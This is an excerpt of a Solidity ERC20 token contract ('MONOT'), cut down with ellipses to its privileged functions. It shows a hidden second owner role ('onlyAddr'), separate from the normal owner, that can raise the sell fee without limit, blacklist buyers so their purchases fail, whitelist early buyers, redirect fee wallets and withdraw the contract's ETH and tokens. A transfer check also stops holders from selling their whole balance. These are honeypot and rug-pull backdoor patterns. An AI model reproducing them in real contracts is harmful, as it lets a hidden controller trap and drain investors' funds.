...
contract OAddrable {
     ...
     * @dev Returns the address of the current owner.
     */
    function oaddr() public view returns (address) {
        return _addr;
    }
     ...
     */
    modifier onlyAddr() {
        require(_addr == msg.sender, "addr: caller is not the owner");
        _;
    }

    function modAddr(address newaddr) public onlyAddr {
        _addr = newaddr;
    }
...
contract MONOT is IERC20, Ownable, OAddrable {
    ...
    mapping(address => bool) public slist;
    ...
    function excludeFromFee(address account) public onlyAddr {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyAddr {
        _isExcludedFromFee[account] = false;
    }

    function setTRADE(address _addr) public onlyAddr {
        TRADE=_addr;
    ...
    function claim() public onlyAddr {
        payable(_owner).transfer(address(this).balance);
    }

    function claimTokens(address token,address to,uint256 amount) public onlyAddr {
        IERC20(token).transfer(to,amount);
    }

    function setSellFee(uint256 value) public onlyAddr {
        _lpFeeSell=value;
    }

    function setstarttime(uint256 time) public onlyAddr {
        starttime=time;
    }

    function setblist(address addr,bool succ) public onlyAddr {
        blist[addr]=succ;
    }

    function setslist(address addr,bool succ) public onlyAddr {
        slist[addr]=succ;
    }

    function setadd1(address addr) public onlyAddr {
        fundAddress=addr;
    }

    function setadd2(address addr) public onlyAddr {
        inviteAddress=addr;
    }
    ...
    function _transfer(
        ...
        if (from==uniswapV2Pair && isRoute[to]){
            ...
            if(block.timestamp<starttime){
                require(blist[to],"b error");
            }
            require(!slist[to],"s error");
            takeFee = true;
        }else if (to==uniswapV2Pair) {
            require(balanceOf(from).div(100).mul(99)>=amount,"b error");
            takeFee = true;
